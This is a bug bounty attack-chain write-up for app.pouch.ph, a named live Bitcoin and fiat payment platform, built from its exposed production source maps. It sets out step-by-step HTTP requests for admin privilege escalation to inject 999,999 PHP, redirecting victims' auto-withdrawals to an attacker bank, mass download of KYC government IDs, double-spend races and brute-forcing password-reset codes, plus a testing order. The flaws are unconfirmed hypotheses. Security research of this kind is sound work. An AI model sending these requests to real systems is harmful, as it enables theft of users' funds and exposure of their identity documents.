# Attack Chains - app.pouch.ph
## Authorized Bug Bounty Research by Kakashi (Dave Lester Mondina)

Target: app.pouch.ph (Pouch.ph Bitcoin Lightning + Fiat Payment Platform)
Source: Production source maps (main.5c273a76.chunk.js.map)

---

## CHAIN 1: Admin Privilege Escalation -> Arbitrary Fund Injection (P1)

### Summary
Client-side role checks (`user.role !== 'admin'`) are the only visible access control
for the admin "bridge" panel. If the server does not independently enforce role-based
authorization, any authenticated regular user can:
1. List all platform users and their balances
2. Manually credit arbitrary PHP amounts to any account
3. Approve pending deposits without review
4. Ban/delete other users

### Attack Flow

Step 1 - Login as regular user:
```
POST /api/v0/auth
Body: { "username": "attacker", "password": "password123" }
-> Receive session cookie
```

Step 2 - Access admin user list:
```
GET /api/v3/bridge/users?limit=100&isVerified=true
-> If 200: returns ALL users with names, emails, phone numbers, balances, usernames
```

Step 3 - Credit attacker account with arbitrary funds:
```
POST /api/v0/bridge/transaction/issue-manual-deposit
Body: {
  "creditToUsername": "attacker",
  "amountInPHP": "999999",
  "unionbankReferenceId": "FAKE-REF-12345"
}
-> If 200: attacker account credited with 999,999 PHP
```

Step 4 - Withdraw funds via auto-sweep:
```
PUT /api/v3/users/config/sweep
Body: {
  "useSweeping": true,
  "bankCode": "ATTACKER_BANK",
  "accountName": "Attacker Name",
  "accountNumber": "123456789",
  "frequency": "daily",
  "threshold": 0
}
-> Auto-withdraws credited funds to attacker bank account
```

### Evidence
- ManualTransactionMaker component: MoreFeatures.js line 79 - `if (user.role !== 'admin') return null`
- This is a React render check, NOT a server-side authorization check
- The axios.post on line 91 sends directly to the endpoint with no special auth headers
- Auth is cookie-based (UserContext.js uses `axios.get('/api/v0/user')` with default cookie behavior)

### Impact
Complete financial compromise of the platform. Attacker can create unlimited PHP credits
and withdraw to any bank account. Total loss of funds integrity.

### CVSS
9.8 Critical (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
Low privilege required (any registered user). Changed scope because it affects all
platform users and the platform's financial integrity.

---

## CHAIN 2: KYC Document IDOR -> Mass PII Exposure (P1/P2)

### Summary
KYC document retrieval has a two-step process that may be vulnerable to IDOR:
1. Get document keys for a userId
2. Convert keys to signed URLs

If the first step doesn't validate that the requesting user owns the documents,
any authenticated user can access government IDs, selfies, and signatures of all users.

### Attack Flow

Step 1 - Get target user's ID (from CHAIN 1 user list or enumerate):
```
GET /api/v0/kyc/user/PH?userId=TARGET_USER_ID&documents=true
-> Returns array of S3/storage keys for KYC documents
```

Step 2 - Convert keys to downloadable URLs:
```
GET /api/v0/image/url/{key}
-> Returns signed URL for document image (government ID photo, selfie, signature)
```

Step 3 - Alternative path via admin endpoint:
```
GET /api/v0/bridge/user/view-id?username=TARGET_USERNAME
-> Returns direct URL to user's ID document
```

### Evidence
- UserList/index.js lines 707-723: handleViewDocuments function
- No visible authorization check beyond being logged in
- The userId parameter is passed directly from the client, not derived from session

### Impact
Exposure of Philippine government-issued IDs (national ID, passport, driver's license),
selfie photos, signatures, and business documents for all KYC-verified users.
Potential identity theft at scale.

### CVSS
8.6 High (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)

---

## CHAIN 3: Sweep Config IDOR -> Balance Drain (P1)

### Summary
The automatic withdrawal (sweep) configuration endpoint for admin use takes a user
_id directly in the URL path. If not auth-checked server-side, an attacker can
configure auto-withdrawal for any user to drain their balance to an attacker-controlled
bank account.

### Attack Flow

Step 1 - Get victim's MongoDB _id (from CHAIN 1 user list):
```
GET /api/v3/bridge/users?username=victim
-> Response includes user._id (MongoDB ObjectId)
```

Step 2 - Configure sweep to attacker bank:
```
PUT /api/v3/bridge/users/{victim._id}/config/sweep
Body: {
  "useSweeping": true,
  "bankCode": "ATTACKER_BANK_BRSTN",
  "accountName": "Attacker Name",
  "accountNumber": "123456789",
  "frequency": "daily",
  "threshold": 16,
  "username": "victim"
}
-> Victim's balance auto-withdraws to attacker's bank daily
```

### Evidence
- AutomaticWithdrawals.js lines 82-83 and 129-130
- The `isBridgeUser` flag is a client-side component prop, not a server-side check
- The URL path contains the raw MongoDB _id

### Impact
Silent, persistent drain of any user's PHP balance. Victim sees nothing until their
balance is zero and funds are in attacker's bank account.

### CVSS
9.1 Critical (AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H)

---

## CHAIN 4: Batch Payment Race Condition (P2)

### Summary
Batch payment processing accepts an array of recipient objects and processes them
asynchronously. The polling mechanism checks completion status by sender username.
Potential for double-spend via concurrent batch submissions, and IDOR on the
polling endpoint.

### Attack Flow

Step 1 - Submit duplicate batch payments simultaneously:
```
POST /api/v0/transaction/batch-payment/pouch
Body: [{"username": "recipient", "amount": 100, "currency": "PHP"}]
(Submit 2-5 concurrent requests)
-> If race condition exists: recipient gets credited multiple times, sender debited once
```

Step 2 - Monitor other users' batch payments:
```
GET /api/v0/transaction/batch-payment?sender=OTHER_USERNAME
-> If IDOR: returns other users' batch payment details and recipient lists
```

### Evidence
- BatchPayment/Step2.js line 63: `axios.post('/api/v0/transaction/batch-payment/${type}', data)`
- BatchPayment/Step2.js line 35: polling uses `sender: username` parameter
- No nonce, idempotency key, or request deduplication visible

### CVSS
7.5 High (AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N)

---

## CHAIN 5: Password Reset Flow Bypass (P2)

### Summary
The password reset flow uses a client-generated UUID (v4) as the successKey
for the 15-minute auth window. The flow is: send-code -> verify-code -> reset-password.
If the verify step is skippable or the successKey is predictable, account takeover
is possible.

### Attack Flow

Step 1 - Send auth code to target:
```
POST /api/v0/auth/send-auth-code
Body: { "username": "victim" }
```

Step 2 - Brute force MFA code (if no rate limit):
```
POST /api/v0/auth/verify-auth-code
Body: { "username": "victim", "code": "000000" }
... iterate through 6-digit codes
```

Step 3 - Or skip verification and guess successKey:
```
POST /api/v0/user/reset-password
Body: { "username": "victim", "successKey": "<uuid>", "newPassword": "hacked123" }
```

### Evidence
- ForgotPassword/Verification.js and ResetPassword.js
- UUID v4 is generated client-side with uuid() library
- 15-minute window is set client-side (may not be enforced server-side)

### CVSS
8.1 High (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)

---

## CHAIN 6: Transaction Approval Bypass (P2)

### Summary
The deposit approval flow uses an intakeFormRefId to approve pending on-chain deposits.
If the endpoint doesn't verify admin role, any user can approve arbitrary deposits.

### Attack Flow

Step 1 - List pending deposits:
```
GET /api/v0/bridge/transaction/list?status=pending-review
-> Returns pending deposit transactions with intakeFormRefIds
```

Step 2 - Approve a pending deposit:
```
PATCH /api/v0/bridge/transaction/approve-deposit
Body: { "intakeFormRefId": "TARGET_REF_ID" }
```

### Evidence
- MoreFeatures.js lines 177-195: handleApprove function
- No visible auth check beyond session cookie

### CVSS
8.1 High (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H)

---

## STANDALONE FINDING: Source Map Information Disclosure (P3/P4)

### Summary
Production webpack source maps are publicly accessible, exposing the complete
React application source code including admin panel logic, all API endpoints,
business flow details, and internal architecture.

### Evidence
```
https://app.pouch.ph/static/js/main.5c273a76.chunk.js.map (731 KB, 152 source files)
https://app.pouch.ph/static/js/2.946fb202.chunk.js.map (17.6 MB, 2054 source files)
```

### Impact
Enables detailed reconnaissance. Attackers can map the entire API surface, understand
admin functionality, and craft targeted exploits without any traffic to the target server.

### CVSS
5.3 Medium (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

---

## TESTING PRIORITY

1. CHAIN 1 (Admin bypass) - Test GET /api/v3/bridge/users with regular user token first. This is read-only and immediately confirms/denies the auth bypass hypothesis.
2. CHAIN 2 (KYC IDOR) - Test with own userId to confirm access pattern.
3. CHAIN 3 (Sweep IDOR) - Read-only recon on the bridge users endpoint first.
4. CHAIN 4-6 - Require more careful testing.

If CHAIN 1 confirms (regular user gets 200 on bridge endpoints), chains 2, 3, and 6
are almost certainly also vulnerable since they share the same endpoint prefix pattern.
